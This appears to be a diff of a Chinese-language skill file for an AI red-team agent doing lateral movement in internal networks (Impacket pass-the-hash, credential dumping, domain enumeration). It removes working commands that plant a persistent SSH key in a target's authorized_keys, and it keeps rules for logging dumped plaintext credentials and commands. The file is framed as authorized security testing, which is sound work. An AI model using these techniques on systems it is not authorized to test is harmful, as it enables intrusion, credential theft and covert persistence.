@@ -1,10 +1,8 @@
 ---
 name: lateral-movement
-description: 【内网】内网横向与提权：Impacket 套件（PtH/PsExec/WMI/DCOM/Kerberos/凭据转储）+ enum4linux/smbclient 信息枚举
+description: 内网横向与提权：Impacket 套件（PtH/PsExec/WMI/DCOM/Kerberos/凭据转储）+ enum4linux/smbclient 信息枚举
 whenToUse: 已进内网，需要用已有凭据或哈希横向到其它主机、枚举域环境、dump 凭据、找域控路径
 role: internal
-category: 内网
-tags: [lateral, ad, impacket]
 enabled: true
 ---
 
@@ -124,32 +122,7 @@ proxychains4 -f runs/proxychains-1080.conf enum4linux -a 10.0.0.6
 # ⚠️ 注意：proxychains 只代理 TCP；Kerberos 的 UDP 部分与部分反连场景需要 chisel/frp 的端口映射
 ```
 
-## 六、Linux 主机 SSH 密钥（给用户可直连的入口）
-
-拿到 Linux 服务器权限、且隧道能到该主机时，除了 WebShell，优先给用户写一把**每靶标独立**的 SSH key，用户可经隧道直接登录。
-
-```bash
-# 1) 本机生成独立密钥（不要复用个人 key；私钥只留本机）
-KEY="$DSH_HOME/redteam/engagements/<靶标>/runs/ssh/<host>-<user>"
-mkdir -p "$(dirname "$KEY")"
-ssh-keygen -t ed25519 -N '' -f "$KEY" -C "redteam-<靶标>-<host>"
-PUB="$(cat "$KEY.pub")"
-
-# 2) 追加到目标 authorized_keys（不覆盖原文件；加 marker 便于清理）
-ssh <user>@<host> "mkdir -p ~/.ssh && chmod 700 ~/.ssh && touch ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && grep -qF '$PUB' ~/.ssh/authorized_keys || echo '$PUB # redteam-<靶标>' >> ~/.ssh/authorized_keys"
-
-# 3) 实测（经隧道时用 ProxyCommand；<listen> 是本地 SOCKS5）
-ssh -i "$KEY" -o BatchMode=yes -o StrictHostKeyChecking=accept-new <user>@<host> 'id'
-# 经隧道示例：ssh -i "$KEY" -o ProxyCommand='nc -X 5 -x 127.0.0.1:1080 %h %p' <user>@<内网IP> 'id'
-```
-
-- 私钥权限 600，只把**路径**写进 `redteam_credential_add` 的 `secret_ref`，不写私钥内容；
-- `redteam_access_add` 记 `method=ssh`、`username`、`session_ref=<私钥路径>`；
-- `redteam_cleanup` 记 `kind=ssh_key`、`location=<用户@host>`、`status=kept`（这是有意保留给用户的入口）；
-- 目标没有 SSH / 禁止密钥登录：回退 RDP 或 WebShell，不要强改 sshd 配置；
-- 写 key 是持久化动作：只对授权目标做，记录指纹，交付说明里列出保留的 key。
-
-## 七、纪律与边界
+## 六、纪律与边界
 
 1. **收敛优先**：内网阶段的目标是**核心系统**（域控 / 堡垒机 / 运维平台 / 数据库集群 / 代码仓库 / 备份系统），
    不是把每台机器都打一遍。横向只是手段，得分点是 `server-host` 与 `central-system`。
@@ -160,7 +133,7 @@ ssh -i "$KEY" -o BatchMode=yes -o StrictHostKeyChecking=accept-new <user>@<host>
 5. **每台新主机都要登记**：`redteam_asset_add`（内网资产，`scope` 自动 internal），
    访问成功 `redteam_access_add`，凭据 `redteam_credential_add`。
 
-## 八、输出与落库（强制）
+## 七、输出与落库（强制）
 
 1. **每台成功横向的主机记分**：`redteam_score_hit`（`server-host`），`evidence` 写
    「源主机 → 目标主机:端口｜用什么凭据/哈希｜执行结果」（如 `10.0.0.5 → 10.0.0.9:445｜PtH 本地管理员哈希｜whoami=nt authority\system`）。
@@ -169,7 +142,7 @@ ssh -i "$KEY" -o BatchMode=yes -o StrictHostKeyChecking=accept-new <user>@<host>
 3. **凭据落库**：`redteam_credential_add`，`source` 写清（`凭据转储`/`Kerberoasting`/`AS-REP`/`凭据复用`/`离线破解`），
    `tool` 写实际命令原文，明文口令写 `secret_value`，文件路径写 `secret_ref`。
 4. **访问会话落库**：`redteam_access_add`（`method=smb`/`wmi`/`pth`/`kerberos`/`ssh`/`rdp`）。
-5. 记分时把实际命令/回显放进 `redteam_score_hit` 的 `command`/`result`，不需要再单独写 chain。
+5. 每个关键动作 `redteam_chain_add`：`stage_code=internal`（内网拿权限）或 `target`（拿靶标），
    **`tool` 写实际命令原文**（含 `-hashes`、`-k -no-pass` 等关键参数，以及 `proxychains4 -f ...` 前缀），
    `result` 写回显摘要——报告要能照着复现。
 6. **回填知识库**：验证有效的通用利用脚本 `redteam_poc_add`（带 `category` + `engagement` + `asset_target` + `verified_note`，脱敏）。
